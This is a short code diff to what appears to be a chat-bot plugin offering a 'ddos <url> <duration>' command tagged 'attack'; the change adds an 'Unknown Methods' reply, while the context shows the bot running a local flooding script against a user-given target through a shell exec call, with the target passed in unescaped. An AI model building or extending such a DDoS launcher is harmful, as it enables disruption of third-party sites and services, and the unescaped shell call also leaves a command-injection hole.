@@ -171,8 +171,10 @@ thumbnailUrl: thumb,
 sourceUrl: `https://check-host.net/check-http?host=${target}`
 }}, text: details}, {quoted: m})
 	exec(`node ./lib/PermenMD/xc.js ${target} ${duration} 100 10`)
+} else {
+	m.reply(`_*Unknown Methods*_`)
 }
-  }
+ }
 
 handler.help = ['ddos'].map(v => v + ' <url> <duration>');
 handler.tags = ['tools', 'attack'];
